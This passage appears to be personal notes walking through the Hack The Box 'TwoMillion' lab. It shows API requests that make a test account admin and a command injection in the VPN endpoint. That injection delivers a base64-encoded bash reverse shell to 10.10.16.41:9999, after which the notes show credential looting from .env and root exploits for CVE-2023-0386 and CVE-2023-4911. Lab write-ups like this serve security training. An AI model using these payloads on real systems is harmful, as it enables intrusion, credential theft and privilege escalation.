User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=oec60vo7k5up4sn7ptf0nuvh1e
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 32

{
  "email": "test@test.com"
}

--_RESPONSE---
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 11 Jun 2026 12:01:22 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 59

{"status":"danger","message":"Missing parameter: is_admin"}
```
![[Pasted image 20260611080710.png]]

- I then add the `is_admin parameter` and set to true (JSON syntax is usually true so entering yes or some other value will not work and it will say email parameter missing again):
```
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=oec60vo7k5up4sn7ptf0nuvh1e
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 51

{
  "email": "test@test.com",
"is_admin": true
}

---RESPONSE---
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 11 Jun 2026 12:08:05 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 76

{"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}
```
![[Pasted image 20260611080815.png]]

- Finally I know I need to set it ot value 1 instead to make the user admin:
```
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=oec60vo7k5up4sn7ptf0nuvh1e
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 48

{
  "email": "test@test.com",
"is_admin": 1
}

---RESPONSE---
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 11 Jun 2026 12:08:59 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 40

{"id":13,"username":"test","is_admin":1}
```
![[Pasted image 20260611080910.png]]

- I vcan confirm by checking the ndpoint: `/api/v1/admin/auth`
![[Pasted image 20260611081023.png]]

- As we see it is now changed to true.
- Now accessing the endpoint to generate a vpn connection for adother user, we get a prameter missing error again
```
--_REQUEST---
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=oec60vo7k5up4sn7ptf0nuvh1e
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 0

--_RESPONSE---
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 11 Jun 2026 12:12:28 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 59

{"status":"danger","message":"Missing parameter: username"}

```
![[Pasted image 20260611081307.png]]

- I get a VPN generated when i use my username:
```
--_REQUEST---
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=oec60vo7k5up4sn7ptf0nuvh1e
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 26

{
  "username": "test"}


--_RESPONSE_--
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 11 Jun 2026 12:15:51 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 10817

client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
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
2iX/ag==
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 6 (0x6)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=UK, ST=London, L=London, O=HackTheBox, OU=VPN, CN=2million/emailAddress=info@hackthebox.eu
        Validity
            Not Before: Jun 11 12:15:51 2026 GMT
            Not After : Jun 11 12:15:51 2027 GMT
        Subject: C=GB, ST=London, L=London, O=test, CN=test
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:b6:f3:7e:91:51:9e:b1:0d:00:a9:50:b4:03:ce:
                    a2:8e:24:28:f8:9b:af:fe:d9:c7:dd:35:81:4f:28:
                    8e:29:9b:39:e5:75:c0:a7:be:fd:5f:1f:d4:31:3c:
                    c8:f1:22:ee:47:13:13:70:b9:b0:e6:79:aa:64:e0:
                    4a:41:02:20:53:81:96:26:20:19:f4:b8:f8:80:16:
                    40:0d:d1:7e:3d:ed:42:d8:73:b2:99:2b:3d:0e:e2:
                    d3:1b:f0:d3:0c:51:0c:a1:33:00:8a:fc:94:a3:36:
                    d2:b6:12:73:03:0a:f3:49:4d:2d:ae:64:93:41:5f:
                    4e:61:76:61:97:de:7c:b8:b6:0e:1b:69:0e:52:4f:
                    45:90:6c:be:1d:cf:d3:1d:0b:af:af:fe:da:0e:db:
                    cb:2c:01:c7:39:4e:69:09:20:74:ca:5d:42:b7:e6:
                    18:ce:31:a7:b4:f9:5b:4f:8f:9a:df:bc:97:55:77:
                    53:07:2e:51:78:35:75:a2:54:15:12:3d:78:af:91:
                    ab:30:aa:6c:54:24:9e:96:ab:c0:ee:7a:23:8f:39:
                    f4:f2:30:9c:a1:84:07:a6:38:97:96:77:52:87:df:
                    5b:1b:c3:f4:4f:d4:37:87:ef:4d:7e:a1:81:14:3d:
                    52:02:57:f1:ac:2a:25:eb:47:59:ee:32:53:4b:ba:
                    f5:ab
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                D6:BC:29:DE:E8:3B:2F:74:86:87:41:34:E3:4B:7E:BE:EC:2B:A2:1C
            X509v3 Authority Key Identifier: 
                7A:62:DD:1D:B6:FE:4A:C8:E3:F8:9F:FA:AC:F4:15:0C:96:BA:2E:91
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Key Usage: 
                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment, Key Agreement, Certificate Sign, CRL Sign
            Netscape Comment: 
                OpenSSL Generated Certificate
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        18:5d:be:00:68:ef:70:c2:27:54:c8:3d:e6:ce:ae:a1:38:1a:
        84:33:41:32:f0:d4:80:94:2a:60:88:97:43:8e:77:a2:81:ab:
        ff:a4:64:e9:43:de:84:c4:89:4c:ed:7c:b5:b2:3f:80:ea:00:
        5a:37:14:58:88:08:01:e1:48:9e:6c:d4:dd:ec:13:08:38:61:
        fc:16:47:74:70:dc:eb:81:63:cd:69:4c:63:31:e6:91:7d:8a:
        91:bf:a6:bc:29:0d:66:a5:8c:e7:19:2b:56:a6:ff:4e:85:c7:
        c8:be:67:58:38:d8:8b:42:23:09:46:ed:83:74:77:44:b3:42:
        9d:1d:e4:a0:f8:84:ec:bd:4f:7a:21:77:dd:f2:3c:1f:e4:04:
        31:be:22:45:1d:31:95:af:d0:f9:fa:e0:dd:e5:39:bb:e9:59:
        0a:9a:b0:5a:85:71:4d:a7:ef:3f:1f:71:4a:0a:8c:0c:14:a4:
        74:01:fc:e0:de:74:fb:a9:02:bc:b6:a0:af:cb:d5:80:20:5f:
        32:d1:d0:82:03:f3:45:45:f4:05:20:3b:40:ce:07:59:b9:da:
        88:6d:35:4e:d9:b7:5a:a8:b2:19:2a:8e:35:7f:a6:b5:f0:bf:
        8d:27:df:9d:10:2c:36:a0:6f:61:fb:67:cc:c8:35:bf:a7:19:
        41:50:9c:09:4d:0f:fe:0a:2a:3d:8d:f9:59:b6:83:1b:2b:44:
        86:1a:7e:28:cf:18:66:b0:3a:31:ea:b4:67:83:8f:3a:5c:91:
        4d:2a:5c:e9:ab:b8:7a:7d:51:ed:66:8b:bc:a6:ee:8e:65:6f:
        fd:46:2f:38:89:5e:c1:25:8e:b7:8f:74:13:cc:63:36:42:0d:
        30:80:c1:5d:8c:ff:f1:1a:31:30:96:1f:17:79:49:bd:0c:0d:
        b3:58:2f:4f:df:4d:01:14:88:2c:ed:39:8c:0d:29:08:74:0e:
        51:ae:be:d5:ba:91:7f:83:13:0a:14:2b:b6:62:09:95:7d:6a:
        cd:d6:1d:e9:8c:b0:9e:f6:ee:a2:0f:dc:4e:23:9d:8b:6f:0d:
        49:d5:04:57:0e:9f:d7:96:2a:3f:9f:cb:48:4c:df:a5:59:5e:
        e1:43:f4:b2:7b:29:e8:a6:e1:fa:63:98:fb:fb:57:72:b7:26:
        ba:62:d1:a1:d6:c7:3f:50:23:a1:1f:ec:d4:85:b2:aa:bd:f1:
        04:02:56:1b:f0:c2:c3:17:ca:7d:bb:b8:37:cd:a9:b8:29:26:
        38:e6:da:f4:89:38:77:fa:0e:c4:a9:c8:3b:27:ca:7f:11:e4:
        bc:14:55:e5:9b:a6:f1:a9:5a:b0:7f:09:1e:63:ff:d9:ab:ed:
        58:67:0d:50:1f:fc:a1:3f
-----BEGIN CERTIFICATE-----
MIIE2zCCAsOgAwIBAgIBBjANBgkqhkiG9w0BAQsFADCBiDELMAkGA1UEBhMCVUsx
DzANBgNVBAgMBkxvbmRvbjEPMA0GA1UEBwwGTG9uZG9uMRMwEQYDVQQKDApIYWNr
VGhlQm94MQwwCgYDVQQLDANWUE4xETAPBgNVBAMMCDJtaWxsaW9uMSEwHwYJKoZI
hvcNAQkBFhJpbmZvQGhhY2t0aGVib3guZXUwHhcNMjYwNjExMTIxNTUxWhcNMjcw
NjExMTIxNTUxWjBNMQswCQYDVQQGEwJHQjEPMA0GA1UECAwGTG9uZG9uMQ8wDQYD
VQQHDAZMb25kb24xDTALBgNVBAoMBHRlc3QxDTALBgNVBAMMBHRlc3QwggEiMA0G
CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC2836RUZ6xDQCpULQDzqKOJCj4m6/+
2cfdNYFPKI4pmznldcCnvv1fH9QxPMjxIu5HExNwubDmeapk4EpBAiBTgZYmIBn0
uPiAFkAN0X497ULYc7KZKz0O4tMb8NMMUQyhMwCK/JSjNtK2EnMDCvNJTS2uZJNB
X05hdmGX3ny4tg4baQ5ST0WQbL4dz9MdC6+v/toO28ssAcc5TmkJIHTKXUK35hjO
Mae0+VtPj5rfvJdVd1MHLlF4NXWiVBUSPXivkaswqmxUJJ6Wq8DueiOPOfTyMJyh
hAemOJeWd1KH31sbw/RP1DeH701+oYEUPVICV/GsKiXrR1nuMlNLuvWrAgMBAAGj
gYkwgYYwHQYDVR0OBBYEFNa8Kd7oOy90hodBNONLfr7sK6IcMB8GA1UdIwQYMBaA
FHpi3R22/krI4/if+qz0FQyWui6RMAkGA1UdEwQCMAAwCwYDVR0PBAQDAgH+MCwG
CWCGSAGG+EIBDQQfFh1PcGVuU1NMIEdlbmVyYXRlZCBDZXJ0aWZpY2F0ZTANBgkq
hkiG9w0BAQsFAAOCAgEAGF2+AGjvcMInVMg95s6uoTgahDNBMvDUgJQqYIiXQ453
ooGr/6Rk6UPehMSJTO18tbI/gOoAWjcUWIgIAeFInmzU3ewTCDhh/BZHdHDc64Fj
zWlMYzHmkX2Kkb+mvCkNZqWM5xkrVqb/ToXHyL5nWDjYi0IjCUbtg3R3RLNCnR3k
oPiE7L1PeiF33fI8H+QEMb4iRR0xla/Q+frg3eU5u+lZCpqwWoVxTafvPx9xSgqM
DBSkdAH84N50+6kCvLagr8vVgCBfMtHQggPzRUX0BSA7QM4HWbnaiG01Ttm3Wqiy
GSqONX+mtfC/jSffnRAsNqBvYftnzMg1v6cZQVCcCU0P/goqPY35WbaDGytEhhp+
KM8YZrA6Meq0Z4OPOlyRTSpc6au4en1R7WaLvKbujmVv/UYvOIlewSWOt490E8xj
NkINMIDBXYz/8RoxMJYfF3lJvQwNs1gvT99NARSILO05jA0pCHQOUa6+1bqRf4MT
ChQrtmIJlX1qzdYd6Yywnvbuog/cTiOdi28NSdUEVw6f15YqP5/LSEzfpVle4UP0
snsp6Kbh+mOY+/tXcrcmumLRodbHP1AjoR/s1IWyqr3xBAJWG/DCwxfKfbu4N82p
uCkmOOba9Ik4d/oOxKnIOyfKfxHkvBRV5Zum8alasH8JHmP/2avtWGcNUB/8oT8=
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC2836RUZ6xDQCp
ULQDzqKOJCj4m6/+2cfdNYFPKI4pmznldcCnvv1fH9QxPMjxIu5HExNwubDmeapk
4EpBAiBTgZYmIBn0uPiAFkAN0X497ULYc7KZKz0O4tMb8NMMUQyhMwCK/JSjNtK2
EnMDCvNJTS2uZJNBX05hdmGX3ny4tg4baQ5ST0WQbL4dz9MdC6+v/toO28ssAcc5
TmkJIHTKXUK35hjOMae0+VtPj5rfvJdVd1MHLlF4NXWiVBUSPXivkaswqmxUJJ6W
q8DueiOPOfTyMJyhhAemOJeWd1KH31sbw/RP1DeH701+oYEUPVICV/GsKiXrR1nu
MlNLuvWrAgMBAAECggEAJ0gV027ic2J202PkGvMpnPpvn52SBtbM3pbH6m6rQ4y0
PCvxzzKnZV7IqT/DZ18YKUOTx37fWEUkTF+KIfYqabOnwQzgddanaJ0eaLkj8Xj5
gs8ouFF73S/fox6sufbHDu+L/MupwHebe4NvlWYrAYCkP88RfRZRFoUcBEc9oUz7
o/ZhPmPF5NLgrvUg3R0tf/5u4Cm3HRE48L/111SzIlYO3OP+WoX+UiiLK+j5l0oD
Gzuddt3ZBrJ8VcOdkHfoRODoSMp4ErH18wcXsrW5FTp1xF1Ap/UJOGkMLn6KrXb4
W5OyOs8Jf6d8yfK97NMNgj/IeIjjpBPqsCznIXY5XQKBgQC5c1YeTUngRVuULwRN
gUwB3I/xedBn2A+N0Yb+90MhmXXZESk2ErAhplPNMO9s6V7KgJXIU/BUzi9N6TfB
bLU3Vjrb8xr/MzzUH6HWxAgor49/xc+S+d4I6XrEDhWgfYQOKaCJ0VSxmIYoDpln
VWm8MZRld4m94b2rRtAqM4Oi9wKBgQD8jL9+F2U/lj5tZ18ISr6agtl1AGhbdqbl
lSKq8vjxON5wpbsSMCSNW95WhfVJEu1e2gQ2tE9RS9b2Y4YFXIi9/ePIV3+jLSYI
8HTrsEE1dukyFzF0PiBt7G3XCLpPOeRJV8MpUX5OyhH8TgwDqtCYdQDO1Ld4v3lQ
H1OxEe7h7QKBgB1embXk0Z1V/qHiLFFF986Xqqg4fXvkqNnx4+o/KH+KuTIuWJN6
tDAwEjd9130tHFj/sjjuqjIUEUPKeo0EdVKVMm8g+haOe8SwWcYUd6JR42z929jP
/4zzxQCFpoErP52qlAUfhMU3fY+ceEj4Ku2mAHVtUAAlXw9gAJmeXOuTAoGBAO4t
Ex+oks0wNbnaBm78htuTUeAdPU4dDXNxfdt5ADwG5QmZ015o1uAV5w70kQqUdhbB
R74LuM4z1wxRegCubyu3OM4lbvOGTduaYrowZJ82gODDrNkzCkSA+GoXChZTw69D
vIPIHnXR7rpjJMOEoetWVSe6xzlyYsekc7qH7iFVAoGAWny8XuA7FPYVjd2EVkrd
6do4fkhxV1MdEJEUhb6D8+Z2pBtOtf4S1DL8nejJ+ALkitYBm5ooVPO8txQ3q2W6
dhLajOhmiHTgvG77+YpFuHXFflbecGOUfs3Uw+fv5oxLQr675RguB64HldK5bL1l
WnlskcukOr9CQ+C8N/LI4ss=
-----END PRIVATE KEY-----
</key>
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
45df64cdd950c711636abdb1f78c058c
358730b4f3bcb119b03e43c46a856444
05e96eaed55755e3eef41cd21538d041
079c0fc8312517d851195139eceb458b
f8ff28ba7d46ef9ce65f13e0e259e5e3
068a47535cd80980483a64d16b7d10ca
574bb34c7ad1490ca61d1f45e5987e26
7952930b85327879cc0333bb96999abe
2d30e4b592890149836d0f1eacd2cb8c
a67776f332ec962bc22051deb9a94a78
2b51bafe2da61c3dc68bbdd39fa35633
e511535e57174665a2495df74f186a83
479944660ba924c91dd9b00f61bc09f5
2fe7039aa114309111580bc5c910b4ac
c9efb55a3f0853e4b6244e3939972ff6
bfd36c19a809981c06a91882b6800549
-----END OpenVPN Static key V1-----
</tls-auth>

```
![[Pasted image 20260611081810.png]]

- But we can anyway already generate this without being admin.
- If this PHP code is using exec or system commands we possibly oculd do command injection if filtering isnt done right. Doing a simply test I get a response that this is being run by `www-data`:
```
---REQUEST---
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=oec60vo7k5up4sn7ptf0nuvh1e
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 34

{
  "username": "test;whoami;"}



---RESPONSE--
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 11 Jun 2026 12:17:23 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 9

www-data
```

![[Pasted image 20260611081751.png]]

- I try to catch a shell byh passing my payload into this command injection vulnerability:
```
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=oec60vo7k5up4sn7ptf0nuvh1e
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 75

{
  "username": "test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40MS85OTk5IDA+JjEK | base64 -d | bash"}
```
![[Pasted image 20260611082057.png]]

- The base 64 was generated from my payload:
```
echo "bash -i >& /dev/tcp/10.10.16.41/9999 0>&1" | base64

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40MS85OTk5IDA+JjEK
```
![[Pasted image 20260611082041.png]]

- I catch a shell on my netcat listener:
![[Pasted image 20260611082121.png]]

- In the shell I find a `.env` file holding username and password:
```
cat .env

--OUTPUT--
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```
![[Pasted image 20260611082407.png]]

- I switch to admin user (as there is a user admin and the creds work on it):
```
su admin
> SuperDuperPass123
```
![[Pasted image 20260611082558.png]]

- I grab the user flag:
![[Pasted image 20260611082633.png]]

## Privilege Escalation 
- Checking mail in `/var/mail` I find something interesting:
```
cd /var/mail
cat admin

---OUTPUT---
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```


- I also check mysql and find some hashes but they don't crack:
```
mysql -u admin -p<pass>
> show databases;
> use htb_prod;
> show tables;
> select * from users;
```
![[Pasted image 20260611083114.png]]

- Looking online baout this `OverlayFS/FUSE` and I find a CVE CVE-2023-0386 with an exploit: https://github.com/puckiestyle/CVE-2023-0386

- I download it locally and zip it to send it to the target:
```
git clone https://github.com/xkaneiki/CVE-2023-0386

zip -r cve.zip CVE-2023-0386
```

- I download it on the target through my python server, unzip and install it:
```
wget http://10.10.16.41/cve.zip

unzip cve.zip
cd  CVE-2023-0386
make all

---OUTPUT---
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘read_buf_callback’:
fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
  106 |     printf("offset %d\n", off);
      |                    ~^     ~~~
      |                     |     |
      |                     int   off_t {aka long int}
      |                    %ld
fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ {aka ‘long unsigned int’} [-Wformat=]
  107 |     printf("size %d\n", size);
      |                  ~^     ~~~~
      |                   |     |
      |                   int   size_t {aka long unsigned int}
      |                  %ld
fuse.c: In function ‘main’:
fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
  214 |     while (read(fd, content + clen, 1) > 0)
      |            ^~~~
      |            fread
fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
  216 |     close(fd);
      |     ^~~~~
      |     pclose
fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
  221 |     rmdir(mount_path);
      |     ^~~~~
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
```
![[Pasted image 20260611091226.png]]

- I pass the first part of the exploit and run it in background:
```
./fuse ./ovlcap/lower ./gc &


---OUTPUT---
[1] 38145
```
![[Pasted image 20260611091252.png]]

- I run the second part of the exploit and become root:
```
./exp


---OUTPUT---
uid:1000 gid:1000
[+] mount success
[+] readdir
[+] getattr_callback
/file
total 8
drwxrwxr-x 1 root   root     4096 Jun 11 12:56 .
drwxrwxr-x 6 root   root     4096 Jun 11 12:56 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386#
```
![[Pasted image 20260611091332.png]]

- I become root:
![[Pasted image 20260611091357.png]]

- I grab root flag:
![[Pasted image 20260611091418.png]]

### Alternate PrivEsc
- Checking GLIBC version:
```
ldd --version

---OUTPUT---
ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
```

- Looking online this is vulnerable to CVE-2023-4911
- I find a PoC: https://github.com/NishanthAnand21/CVE-2023-4911-PoC
- I compile it locally:
```
gcc exploit.c -o exploit
```
- I send the compiled program and the `genlib.py` file to target.
- I run genlib.py
```
python3 genlib.py
```

- Finally I run the exploit program:
```
chmod +x exploit
./exploit

---OUTPUT---
try 100
try 200
try 300
try 400
try 500
try 600
try 700
try 800
try 900                                                                                                
#
```
![[Pasted image 20260611095832.png]]


### Additional Data
- We also see a `thank_you.kson` file her.
- Reading it we see
```
cat thank_you.json

---OUTPUT---
root@2million:/root# cat thank_you.json 
